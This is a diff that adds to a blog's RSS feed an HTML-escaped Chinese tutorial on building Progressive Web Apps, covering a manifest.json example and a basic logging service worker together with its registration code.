@@ -8,6 +8,955 @@
         <atom:link href="http://www.vinny.cc/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
+               <title>Progressive Web App 汇总使用说明</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-pwa是什么&quot; id=&quot;markdown-toc-1-pwa是什么&quot;&gt;1. PWA是什么&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-有什么特性&quot; id=&quot;markdown-toc-2-有什么特性&quot;&gt;2. 有什么特性&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-基本组成结构&quot; id=&quot;markdown-toc-3-基本组成结构&quot;&gt;3. 基本组成结构&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-编写原生的pwa应用&quot; id=&quot;markdown-toc-4-编写原生的pwa应用&quot;&gt;4. 编写原生的PWA应用&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#41-应用描述文件&quot; id=&quot;markdown-toc-41-应用描述文件&quot;&gt;4.1 应用描述文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#42-首页文件注册-manifestjson&quot; id=&quot;markdown-toc-42-首页文件注册-manifestjson&quot;&gt;4.2 首页文件注册 manifest.json&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#43-服务工作文件&quot; id=&quot;markdown-toc-43-服务工作文件&quot;&gt;4.3 服务工作文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#44-脚本文件中注册-service-workerjs&quot; id=&quot;markdown-toc-44-脚本文件中注册-service-workerjs&quot;&gt;4.4 脚本文件中注册 service-worker.js&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#45-发布到服务器中&quot; id=&quot;markdown-toc-45-发布到服务器中&quot;&gt;4.5 发布到服务器中&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#46-实现基本的离线存储&quot; id=&quot;markdown-toc-46-实现基本的离线存储&quot;&gt;4.6 实现基本的离线存储&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#47-激活更新事件&quot; id=&quot;markdown-toc-47-激活更新事件&quot;&gt;4.7 激活更新事件&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#5-对-pwa-应用进行审计&quot; id=&quot;markdown-toc-5-对-pwa-应用进行审计&quot;&gt;5. 对 PWA 应用进行审计&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录a-不同浏览器对-pwa-应用缓存的限制&quot; id=&quot;markdown-toc-附录a-不同浏览器对-pwa-应用缓存的限制&quot;&gt;附录A 不同浏览器对 PWA 应用缓存的限制&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录b-pwa在ios中的问题与解决方法&quot; id=&quot;markdown-toc-附录b-pwa在ios中的问题与解决方法&quot;&gt;附录B PWA在IOS中的问题与解决方法&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录c-实验中的pwa应用参考&quot; id=&quot;markdown-toc-附录c-实验中的pwa应用参考&quot;&gt;附录C 实验中的PWA应用参考&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#附录d-如何对pwa进行远程调试&quot; id=&quot;markdown-toc-附录d-如何对pwa进行远程调试&quot;&gt;附录D 如何对PWA进行远程调试&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#参考文章&quot; id=&quot;markdown-toc-参考文章&quot;&gt;参考文章&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;1-pwa是什么&quot;&gt;1. PWA是什么&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Progressive Web App&lt;/strong&gt;，简称 &lt;strong&gt;pwa&lt;/strong&gt;，中文名称为 &lt;em&gt;渐进式网页应用&lt;/em&gt;。它的目的是利用web的技术给移动端的设备提供原生App的体验。&lt;/p&gt;
+
+&lt;h2 id=&quot;2-有什么特性&quot;&gt;2. 有什么特性&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;离线或网络环境差的情况下也能正常工作&lt;/li&gt;
+  &lt;li&gt;响应的加载速度和原生应用没有区别&lt;/li&gt;
+  &lt;li&gt;界面布局和原生应用相一致&lt;/li&gt;
+  &lt;li&gt;拥有后台运行和推送通知的能力&lt;/li&gt;
+  &lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3-基本组成结构&quot;&gt;3. 基本组成结构&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/1523604475510f808913f4f.jpeg&quot; alt=&quot;pwa组成&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;断网或网络差，基于常驻后台的 &lt;strong&gt;Service Worker&lt;/strong&gt; 实现数据离线存储与通知推送。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;关于各个浏览器针对于 &lt;em&gt;pwa&lt;/em&gt; 应用缓存的大小限制，请参看 &lt;strong&gt;附录A 不同浏览器对 PWA 应用缓存的限制&lt;/strong&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;4-编写原生的pwa应用&quot;&gt;4. 编写原生的PWA应用&lt;/h2&gt;
+
+&lt;p&gt;编写 &lt;strong&gt;PWA&lt;/strong&gt; 应用前，应该已经有一个标准的响应式的 Web站点，可以正常在浏览器中打开。&lt;/p&gt;
+
+&lt;p&gt;另外建议在网站根路径中准备好 &lt;strong&gt;favicon.ico&lt;/strong&gt; 的图标。&lt;/p&gt;
+
+&lt;h3 id=&quot;41-应用描述文件&quot;&gt;4.1 应用描述文件&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;manifest.json&lt;/strong&gt; 文件是 Web 站点的描述文件，用来告诉浏览器 PWA应用 的基本信息，包括名称、图标、启动页、背景色等等。完整的 manifest.json 配置请参看 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//developer.mozilla.org/en-US/docs/Web/Manifest&quot;&gt;Web App Manifest properties&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;在工程的根路径中创建 &lt;strong&gt;manifest.json&lt;/strong&gt; 文件，内容如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;欢迎来到 Vinny Blog&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;short_name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vinny Blog&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start_url&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;display&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;standalone&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;orientation&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;portrait&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;background_color&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#ccc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;theme_color&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#5FAAE5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;这是一个简单测试的pwa应用&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;icons&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;src&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/assets/icons/icon-72x72.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sizes&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;72x72&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;384&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;像素icon&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;具体属性释义：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;名称&lt;/th&gt;
+      &lt;th&gt;含义&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;name&lt;/td&gt;
+      &lt;td&gt;显示在”Add Home Screen”的横幅中&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;short_name&lt;/td&gt;
+      &lt;td&gt;桌面app的名称&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;display&lt;/td&gt;
+      &lt;td&gt;为standalone则隐藏浏览器UI，bowser则相反&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;orientation&lt;/td&gt;
+      &lt;td&gt;界面的初始方向，portrait竖屏，landscape横屏&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;background_color&lt;/td&gt;
+      &lt;td&gt;app启动画面的背景颜色&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;theme_color&lt;/td&gt;
+      &lt;td&gt;app状态栏背景色&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果觉得手写 &lt;strong&gt;manifest.json&lt;/strong&gt; 文件过于繁琐，可以使用在线生成 &lt;a href=&quot;https://app-manifest.firebaseapp.com/&quot;&gt;Web App Manifest Generator&lt;/a&gt; 的方式。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;42-首页文件注册-manifestjson&quot;&gt;4.2 首页文件注册 manifest.json&lt;/h3&gt;
+
+&lt;p&gt;创建好的 &lt;strong&gt;manifest.json&lt;/strong&gt; 文件，需要在 &lt;strong&gt;index.html&lt;/strong&gt; 首页的 &lt;em&gt;link&lt;/em&gt; 标签中进行定义，这样浏览器才会进行读取。&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    ...
+    
+    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 注册 manifest.json 文件 --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manifest&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/manifest.json&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 应与 manifest.json 中的 theme_color属性 一致 --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;theme-color&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#5FAAE5&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;format-detection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;telephone=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;msapplication-tap-highlight&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    
+    ...
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;这样的配置对于 &lt;strong&gt;Chrome&lt;/strong&gt; 浏览器足够使用了，但对于 IOS 系统的 &lt;strong&gt;safari&lt;/strong&gt; 浏览器仍然不行，IOS 系统在 11.3 版本之后才开始对 PWA 应用的支持，但仍然有不少问题，具体在如何适配请参看 &lt;strong&gt;附录B PWA在IOS中的问题与解决方法&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;43-服务工作文件&quot;&gt;4.3 服务工作文件&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;ServiceWorker&lt;/strong&gt; 即工作线程，简称 &lt;strong&gt;sw&lt;/strong&gt;，当访问站点时会以此域名将 &lt;strong&gt;sw&lt;/strong&gt; 进行注册，一旦进行注册则会在浏览器中形成常驻的工作线程。值得注意的是 &lt;strong&gt;sw&lt;/strong&gt; 不能直接操作 DOM 元素，它更像个代理程序，用来转发数据。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;查看当前浏览器已经注册的服务工作线程 &lt;strong&gt;chrome://serviceworker-internals&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;在工程根路径中创建 &lt;strong&gt;service-worker.js&lt;/strong&gt; 文件，文件的所在路径与作用域 scope 相关，注册在那个路径里，就只能对此路径有访问权限，在根路径中表示对整个站点有效。&lt;/p&gt;
+
+&lt;p&gt;下面是 &lt;strong&gt;service-worker.js&lt;/strong&gt; 文件是一个简单的实现：&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 安装事件&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'install'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker Install'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// 激活事件&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'activate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker Activate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// 请求事件&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fetch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;44-脚本文件中注册-service-workerjs&quot;&gt;4.4 脚本文件中注册 service-worker.js&lt;/h3&gt;
+
+&lt;p&gt;脚本文件是站点的其他 js 文件，在此文件中进行 sw 的注册，才可以正常使用，注册如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 判断浏览器是否支持 ServiceWorker&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'serviceWorker'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;navigator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'load'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 注册&quot;serviceWorker&quot;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;navigator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serviceWorker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/service-worker.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;registration&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker registration success with scope: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;registration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker registration failed: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
